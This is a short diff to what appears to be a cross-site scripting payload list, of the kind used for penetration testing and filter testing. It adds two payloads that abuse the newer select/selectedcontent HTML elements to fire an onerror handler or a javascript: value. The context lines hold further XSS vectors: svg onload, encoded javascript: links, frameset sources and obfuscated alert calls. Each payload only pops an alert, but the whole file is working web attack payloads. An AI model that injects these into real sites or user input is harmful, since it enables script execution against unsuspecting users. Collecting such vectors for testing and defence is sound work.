@@ -12,6 +12,8 @@ ${alert`XSS`}
 <a href=&#106avascript:'%5C\u0075003C'+svg/'+'onload%5C\u0075003Dalert%5C\u00750028)\\u003E'>
 #&lt;img/src/onerror=alert(1)&gt;
 1"Onxx=><Svg/Onload=alert(1)//
+<select><button><selectedcontent><img src="x" onerror="alert(1)">x</selectedcontent></button><option><img src="x">x</option></select>
+<select><button><selectedcontent><option selected=javascript:1></selectedcontent></button><option><img src="x">x</option></select>
 <frameset><frame src="javascript:alert(origin)"></frameset>
 <s"vg o"nload=al"ert() />
 <!--><svg onload=top[/al/.source+/ert/.source](/XSS/.source)>
